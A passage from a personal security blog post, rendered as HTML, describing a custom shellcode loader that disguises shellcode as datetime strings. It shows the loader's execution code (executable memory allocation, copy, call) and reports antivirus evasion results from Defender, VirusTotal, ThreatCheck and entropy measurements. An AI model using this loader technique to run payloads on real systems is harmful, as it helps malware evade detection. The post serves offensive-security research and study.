+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;0x%02X, &#34;</span>, recovered[i]);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// if ((i + 1) % 16 == 0) printf(&#34;\\n&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;}};</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>shellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, recovered_len,
+</span></span><span style="display:flex;"><span>                            MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE,
+</span></span><span style="display:flex;"><span>                            PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>shellcode) {{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;VirtualAlloc failed</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(shellcode, recovered, recovered_len);
+</span></span><span style="display:flex;"><span>((<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)())shellcode)();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span></code></pre></div><p>Here, the shellcode is not hardcoded but is stored inside <code>recovered[]</code> as the datetime strings get parsed and decoded. Then, we VAlloc and run it.<br>
+We can see that Windows Defender is in a deep sleep state:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/windows_def_sleepin.gif" alt=""  />
+</p>
+<p>Wondering the detection rate of my loader, I navigated to VT again and uploaded the new sample, which led to 6 detections:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/VT_datetime_shellcode.png" alt=""  />
+</p>
+<p>I was not pleased with it, but then realized that a big factor of the detections is due to the VAlloc and the execution. All shellcode loaders test their detection rate based solely on the decoding/decryption routine rather than the execution (i.e., if i write gibberish shellcode that does absolutely nothing, but place the VAlloc and the execution, I will still get detections).</p>
+<p>So, removing the part of the allocation and the execution, testing only for the decoding routine of my loader, we where met with only 2 detections:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/VT-datetime-noExecution.png" alt=""  />
+</p>
+<p>From where these two detection rates are coming from, I am not entirely sure.  I also made use of the <code>ThreatCheck</code> tool to maybe get an inside of the &ldquo;bad&rdquo; bytes that my binary might had, but got no insights from it, as it resulted in 0 detections:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/threatCheck.png" alt=""  />
+</p>
+<p>Also, concerning entropy, the shellcode obfuscator did pretty decent, with the entropy being at approx. 4.92, which is much more representative of English words rather than appearing as encrypted or compressed (<em>Normal English text usually scores between 3.5 and 5 on a scale from 0 to 8, whereas encrypted or compressed data tends to score above 7.5</em>):</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/shannon_entropy.png" alt=""  />
+</p>
+<p>Further techniques can be applied such as signing the binary or disabling compiler optimization, just to see if the results will differ. But for now, I only wanted to test my shellcode obfuscator as it is, and compare it to other techniques that you can <a href="https://www.youtube.com/watch?v=SG9tO1uCkNM&amp;t=1888s">watch here</a>.</p>
+<p>Since some of the most successful obfuscation (at least public ones) have a detection rate around 2 AV&rsquo;s, I think my first shellcode obfuscator did pretty decent:)</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/all_known_techniques.png" alt=""  />
+</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>This was just a project I thought would be fun to build — something that gives a little &ldquo;insight,&rdquo; if you can call it that, into how I imagined hiding and converting raw bytes into valid-looking strings. By figuring out how many bits each field of a format can hold, and then combining that with clever use of metadata for obfuscation, we can pretty much set our imagination as the limit for what can be achieved. It shows that shellcode — and other data — can be stealthily embedded into everyday strings used across systems, applications, logs, and more.</p>
+<p>I hope I explained the whole process in a way that made sense, and that you enjoyed reading it as much as I enjoyed making it :)</p>
+<p>The final code can be found on my <a href="https://github.com/connar/datetime-shellcode-loader">github</a>.</p>
+<p><strong>References</strong></p>
+<blockquote>
+    <ul>
+        <li> [1] <a href="https://thelongcon.ca/slides/2024/Mike%20Saunders%20-%20Hiding%20in%20Plain%20Sight.pdf">Mike Saunders: <i>Hiding in Plain Sight</i></a></li>
+    </ul>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/shellcode/">Shellcode</a></li>
+      <li><a href="http://localhost:1313/tags/obfuscation/">Obfuscation</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
